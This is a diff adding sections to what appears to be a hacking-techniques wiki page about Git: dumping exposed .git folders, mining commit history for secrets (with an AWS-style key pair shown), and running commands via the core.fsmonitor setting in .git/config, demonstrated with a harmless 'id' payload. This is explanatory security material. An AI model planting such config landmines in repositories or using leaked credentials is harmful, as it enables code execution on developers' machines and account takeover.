@@ -43,6 +43,47 @@ $ pip install git-dumper
 $ git-dumper http://example.com/.git git/
 ```
 
+Then use the source code to perform more targeted attacks, or look for secrets, even in history:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ git log -p  # Show commits with diffs
+</strong>...
++++ b/secret.py
+@@ -0,0 +1,85 @@
++access_key_id = "AKIA6CFMOGSLALOPETMB"
++secret_access_key = "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"
++region = "us-east-2"
+...
+<strong>$ git branch -a  # List all branches
+</strong>* master
+  secret
+</code></pre>
+
+## Attacking Git Commands
+
+Git is a very flexible system, allowing many settings to be changed to decide how CLI tools interact with the repository. These configuration variables can allow executing arbitrary commands however when certain git commands are executed. Similar to [#git-hooks](../linux/linux-privilege-escalation/known-services.md#git-hooks "mention"), the `core.fsmonitor` variable in `.git/config` is a common one that can be set to a bash command to execute:
+
+{% code title=".git/config" %}
+```diff
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
++       fsmonitor = "id | tee /tmp/pwned > /dev/tty"
+```
+{% endcode %}
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ git status
+</strong>uid=1001(user) gid=1001(user) groups=1001(user)
+...
+</code></pre>
+
+Many shell extensions like [Starship](https://github.com/starship/starship/issues/3974) use `git` to get the current repository and are vulnerable to this, as well as [Visual Studio Code](https://www.sonarsource.com/blog/securing-developer-tools-git-integrations/#example-of-affected-ide-visual-studio-code) (now only with Trusted Mode). To find such issues, you can create a malicious repository with as many landmines as possible that trigger on different commands. This creates an empty repository with most known ways to execute commands:
+
+{% embed url="https://github.com/jwilk/git-landmine" %}
+Create a repository with `.git/config` and `hooks` GIT landmines (`lib/payload` = payload)
+{% endembed %}
+
 ## Git Snippets
 
 If you're running a git repository, you might need some complicated actions from time to time. This is a collection of some common actions as commands to quickly copy and paste.&#x20;
